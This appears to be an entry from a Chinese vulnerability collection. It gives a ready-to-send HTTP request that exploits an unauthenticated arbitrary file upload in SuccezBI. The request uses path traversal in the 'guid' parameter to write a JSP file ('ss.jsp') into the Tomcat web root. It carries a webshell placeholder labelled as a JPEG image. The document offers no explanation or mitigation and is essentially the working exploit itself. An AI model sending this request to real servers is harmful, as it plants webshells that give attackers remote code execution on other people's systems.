## 赛思 SuccezBl前台任意文件上传
```
POST /succezbi/sz/commons/form/file/uploadChunkFile?guid=../tomcat/webapps/ROOT/&chunk=ss.jsp HTTP/1.1
Host: 10.168.4.99:808
Content-Length: 49564
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8GeAY18LCxR7XnVP
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8, application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN, zh;q=0.9
Cookie: JSESSIONID=7351EFC189410384FF702A41106FF4A2
Connection: close

------WebKitFormBoundary8GeAY18LCxR7XnVP
Content-Disposition: form-data; name="file"; filename="www"
Content-Type: image/jpeg

webshell

------WebKitFormBoundary8GeAY18LCxR7XnVP
Content-Disposition: form-data; name="xxx"

confirm
------WebKitFormBoundary8GeAY18LCxR7XnVP--
```
